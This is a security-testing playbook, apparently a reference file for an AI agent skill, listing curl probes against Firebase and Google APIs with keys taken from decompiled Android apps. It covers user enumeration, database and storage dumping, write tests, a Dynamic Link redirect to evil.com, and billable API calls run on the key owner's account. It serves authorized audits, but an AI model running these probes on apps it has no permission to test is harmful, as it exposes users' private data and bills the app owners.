# Firebase & Google API Key Testing

Systematic tests to run against Firebase services and Google APIs when an Android APK exposes API keys and Firebase configuration. **Only run this playbook on apps you are authorized to test** (your own apps, engagements with a signed scope, or bug-bounty programs that explicitly allow it).

This reference is invoked from Phase 9 of `SKILL.md`, and only after `scripts/find-firebase-config.sh` confirms that Google API keys or Firebase configuration exist in the decompiled output. If no keys are found, skip this phase entirely.

---

## Prerequisites — Extracting Configuration

Before running any test, extract these values from the decompiled APK:

| Value | Typical location |
|---|---|
| `API_KEY` | `res/values/strings.xml` → `google_api_key`; `AndroidManifest.xml` → `com.google.android.maps.v2.API_KEY` |
| `PROJECT_ID` | `res/values/strings.xml` → `project_id` |
| `DB_URL` | `res/values/strings.xml` → `firebase_database_url` |
| `GCM_SENDER_ID` | `res/values/strings.xml` → `gcm_defaultSenderId` |
| `APP_ID` | `res/values/strings.xml` → `google_app_id` |
| `STORAGE_BUCKET` | `res/values/strings.xml` → `google_storage_bucket` |
| `OAUTH_CLIENT_ID` | `res/values/strings.xml` → `default_web_client_id` |
| Additional keys | `assets/appsettings.json`, `assets/google-services.json`, other config files |

Test with **every key** found — different keys often belong to different GCP projects with different APIs enabled.

Set shell variables before running requests:

```bash
API_KEY="<extracted_api_key>"
PROJECT_ID="<extracted_project_id>"
DB_URL="<extracted_database_url>"
APP_ID="<extracted_app_id>"
GCM_SENDER_ID="<extracted_gcm_sender_id>"
PACKAGE="<app_package_name>"
```

The automation script `scripts/test-firebase-google.sh` runs the full matrix below and produces a machine-readable report. Use this reference when you need to understand why a given probe exists, or when you need to re-run one manually.

---

## 1. Firebase Authentication

### 1.1 Anonymous Signup
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}' | python3 -m json.tool
```
- **Open:** returns `idToken`, `refreshToken`, `localId` — save `idToken` as `$JWT` and reuse across the authenticated tests below.
- **Blocked:** `ADMIN_ONLY_OPERATION` or `OPERATION_NOT_ALLOWED`.

### 1.2 Email/Password Signup
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"email":"testaudit@proton.me","password":"AuditTest123!","returnSecureToken":true}' | python3 -m json.tool
```

### 1.3 Email/Password Sign-In
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test123","returnSecureToken":true}' | python3 -m json.tool
```

### 1.4 Auth Providers for Email (user enumeration)
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"identifier":"test@test.com","continueUri":"https://example.com"}' | python3 -m json.tool
```
**Look for:** `registered: true/false` (enumeration), `allProviders` (enabled auth methods).

### 1.5 Google Sign-In Provider
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"postBody":"id_token=test&providerId=google.com","requestUri":"https://example.com","returnSecureToken":true}' | python3 -m json.tool
```
**Look for:** `OPERATION_NOT_ALLOWED` (disabled) vs `INVALID_IDP_RESPONSE` (enabled but bad token).

### 1.6 Apple Sign-In Provider
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithIdp?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"postBody":"id_token=test&providerId=apple.com","requestUri":"https://example.com","returnSecureToken":true}' | python3 -m json.tool
```

### 1.7 Phone Auth
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendVerificationCode?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber":"+1234567890","recaptchaToken":"test"}' | python3 -m json.tool
```

### 1.8 Email Link Sign-In
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"requestType":"EMAIL_SIGNIN","email":"test@test.com","continueUrl":"https://example.com"}' | python3 -m json.tool
```

### 1.9 Password Reset (user enumeration)
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"requestType":"PASSWORD_RESET","email":"admin@target.com"}' | python3 -m json.tool
```
**Look for:** `EMAIL_NOT_FOUND` vs success (user exists → enumeration).

### 1.10 Custom Token Sign-In
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"token":"test","returnSecureToken":true}' | python3 -m json.tool
```

### 1.11 Lookup Account by Token (requires a `$JWT` from 1.1 or 1.2)
```bash
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"idToken\":\"${JWT}\"}" | python3 -m json.tool
```

---

## 2. Firebase Realtime Database

### 2.1 Root Read (unauthenticated)
```bash
curl -s "${DB_URL}/.json"
curl -s "${DB_URL}/.json?shallow=true"
```

### 2.2 Common Paths
```bash
for path in users config app_config settings stores products public version notifications orders customers messages; do
  echo "--- /${path} ---"
  curl -s "${DB_URL}/${path}.json"
done
```

### 2.3 Read Rules
```bash
curl -s "${DB_URL}/.settings/rules.json"
```

### 2.4 Authenticated Read (requires `$JWT`)
```bash
curl -s "${DB_URL}/.json?auth=${JWT}"
curl -s "${DB_URL}/.json?shallow=true&auth=${JWT}"
for path in users config settings stores; do
  curl -s "${DB_URL}/${path}.json?auth=${JWT}"
done
```

### 2.5 Write Test (unauthenticated — always clean up)
```bash
curl -s -X PUT "${DB_URL}/audit_test.json" -d '{"test":true}'
curl -s -X DELETE "${DB_URL}/audit_test.json"
```

---

## 3. Cloud Firestore

### 3.1 List Root Documents
```bash
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents?key=${API_KEY}"
```

### 3.2 Common Collections
```bash
for col in users customers orders products config settings app_config prescriptions stores notifications; do
  curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${col}?key=${API_KEY}&pageSize=3"
done
```

### 3.3 Authenticated (requires `$JWT`)
```bash
curl -s "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents" \
  -H "Authorization: Bearer ${JWT}"
```

---

## 4. Firebase Remote Config

```bash
curl -s -X POST "https://firebaseremoteconfig.googleapis.com/v1/projects/${GCM_SENDER_ID}/namespaces/firebase:fetch?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -H "X-Goog-Api-Key: ${API_KEY}" \
  -H "X-Android-Package: ${PACKAGE}" \
  -d "{
    \"appInstanceId\": \"test_instance\",
    \"appId\": \"${APP_ID}\",
    \"languageCode\": \"en\",
    \"platformVersion\": \"26\",
    \"sdkVersion\": \"21.6.4\",
    \"packageName\": \"${PACKAGE}\",
    \"appVersion\": \"1.0.0\"
  }"
```
**Look for:** `"state": "UPDATE"` with `entries` containing config values (exposed) vs `"state": "NO_TEMPLATE"` (empty).

---

## 5. Firebase Cloud Storage

```bash
# Try both bucket naming conventions
curl -s "https://firebasestorage.googleapis.com/v0/b/${PROJECT_ID}.appspot.com/o?key=${API_KEY}"
curl -s "https://firebasestorage.googleapis.com/v0/b/${PROJECT_ID}.firebasestorage.app/o?key=${API_KEY}"
```
**Look for:** JSON with `items` array (listing files) vs `403`/`404`.

---

## 6. Firebase Dynamic Links

```bash
curl -s -X POST "https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "longDynamicLink": "https://<domain>.page.link/?link=https://evil.com&apn=<package>"
  }'
```
**Look for:** URL whitelist validation error (secure) vs short link creation (phishing vector).

---

## 7. Firebase Cloud Messaging (FCM)

```bash
# Legacy API
curl -s -X POST "https://fcm.googleapis.com/fcm/send" \
  -H "Authorization: key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"to":"test_token","notification":{"title":"Security Audit","body":"Test"}}'
```

---

## 8. Gemini API (TruffleSecurity attack vector)

Reference: <https://trufflesecurity.com/blog/google-api-keys-werent-secrets-but-then-gemini-changed-the-rules>

### 8.1 List Files (may contain private uploaded data)
```bash
curl -s "https://generativelanguage.googleapis.com/v1beta/files?key=${API_KEY}"
```

### 8.2 List Models
```bash
curl -s "https://generativelanguage.googleapis.com/v1beta/models?key=${API_KEY}"
```

### 8.3 Cached Contents (may contain private cached prompts/data)
```bash
curl -s "https://generativelanguage.googleapis.com/v1beta/cachedContents?key=${API_KEY}"
```

### 8.4 Generate Content (free AI usage at victim's expense)
```bash
curl -s -X POST "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=${API_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"contents":[{"parts":[{"text":"Say hello"}]}]}'
```

**Critical if 200 OK:** the key grants access to Gemini — also inspect `/files` and `/cachedContents` for private data exposure.
**Safe:** `SERVICE_DISABLED` (403).

---

## 9. Other Google APIs (Billable)

### 9.1 Maps Platform (all billable per-request)
```bash
curl -s "https://maps.googleapis.com/maps/api/place/textsearch/json?query=test&key=${API_KEY}"
curl -s "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=0,0&radius=500&key=${API_KEY}"
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=${API_KEY}"
curl -s "https://maps.googleapis.com/maps/api/directions/json?origin=A&destination=B&key=${API_KEY}"
curl -s "https://maps.googleapis.com/maps/api/distancematrix/json?origins=A&destinations=B&key=${API_KEY}"
curl -s "https://maps.googleapis.com/maps/api/elevation/json?locations=0,0&key=${API_KEY}"
curl -s "https://roads.googleapis.com/v1/snapToRoads?path=0,0|1,1&key=${API_KEY}"
curl -sI "https://maps.googleapis.com/maps/api/staticmap?center=0,0&zoom=5&size=600x300&key=${API_KEY}"
```

### 9.2 AI/ML APIs
```bash
curl -s -X POST "https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}" \
  -H "Content-Type: application/json" -d '{"requests":[]}'

curl -s -X POST "https://language.googleapis.com/v1/documents:analyzeSentiment?key=${API_KEY}" \
  -H "Content-Type: application/json" -d '{"document":{"type":"PLAIN_TEXT","content":"test"}}'

curl -s -X POST "https://translation.googleapis.com/language/translate/v2?key=${API_KEY}" \
  -H "Content-Type: application/json" -d '{"q":"hello","target":"es"}'

curl -s -X POST "https://speech.googleapis.com/v1/speech:recognize?key=${API_KEY}" \
  -H "Content-Type: application/json" -d '{"config":{"languageCode":"en-US"},"audio":{"content":""}}'

curl -s -X POST "https://texttospeech.googleapis.com/v1/text:synthesize?key=${API_KEY}" \
  -H "Content-Type: application/json" -d '{"input":{"text":"test"},"voice":{"languageCode":"en-US"},"audioConfig":{"audioEncoding":"MP3"}}'
```

### 9.3 Other Services
```bash
curl -s "https://www.googleapis.com/customsearch/v1?key=${API_KEY}&q=test&cx=000000000000000000000:aaaaaaaaaaa"
curl -s "https://www.googleapis.com/youtube/v3/search?key=${API_KEY}&part=snippet&q=test&maxResults=1"
curl -s "https://cloudfunctions.googleapis.com/v1/projects/${PROJECT_ID}/locations/-/functions?key=${API_KEY}"
```

---

## Interpreting Results

| Response | Meaning |
|---|---|
| `SERVICE_DISABLED` (403) | API not enabled on this project — not exploitable |
| `PERMISSION_DENIED` (403) | API enabled but key restricted or security rules block access |
| `REQUEST_DENIED` | API not activated for this key specifically |
| `200 OK` with data | **VULNERABLE** — API is accessible with this key |
| `ADMIN_ONLY_OPERATION` | Firebase Auth operation restricted to admin SDK |
| `OPERATION_NOT_ALLOWED` | Firebase Auth provider is disabled |
| `NO_TEMPLATE` | Remote Config has no template — no data exposed |
| `404 Not Found` | Endpoint does not exist for this project |

---

## Reporting Notes

- Test with **every** key found in the APK — different keys may belong to different GCP projects with different APIs enabled.
- Error messages often leak GCP project numbers — record them for reconnaissance.
- If anonymous signup works, reuse the returned JWT for all authenticated endpoints.
- If email/password signup works, create a throwaway account and retest Firestore, Realtime DB, and Storage under that identity.
- Always clean up any write/create operations (Realtime DB PUT, dynamic links, FCM test sends).
- Document each finding with: API key fingerprint (first 6 chars), endpoint, HTTP status, and excerpt of response.
